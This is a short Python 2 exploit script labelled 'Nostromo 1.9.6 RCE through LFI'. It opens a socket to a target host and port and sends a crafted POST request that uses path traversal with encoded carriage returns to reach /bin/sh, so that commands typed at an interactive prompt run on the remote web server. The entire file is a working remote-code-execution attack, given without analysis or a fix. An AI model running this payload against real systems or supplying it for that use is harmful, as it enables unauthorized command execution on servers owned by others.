import socket
import sys
import re
def recvall(s):
 tdata=''
 while 1:
  pdata=s.recv(1024)
  if len(pdata)==0:
   break
  tdata+=pdata
 return tdata
print('-'*55)
print("Nostromo 1.9.6 RCE through LFI")
print('-'*55)
if len(sys.argv)<3 :
 print("Syntax:python %s <host> <port>")%(sys.argv[0])
else :
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 host=str(sys.argv[1])
 port=int(sys.argv[2])
 s.connect((host,port))
 cmd=raw_input("zyp_T-1.0$ ")
 payload=("POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{}").format(cmd)
 s.send(payload)
 op=recvall(s)
 op=str(op)
 print(op)
 s.close()
 op=''
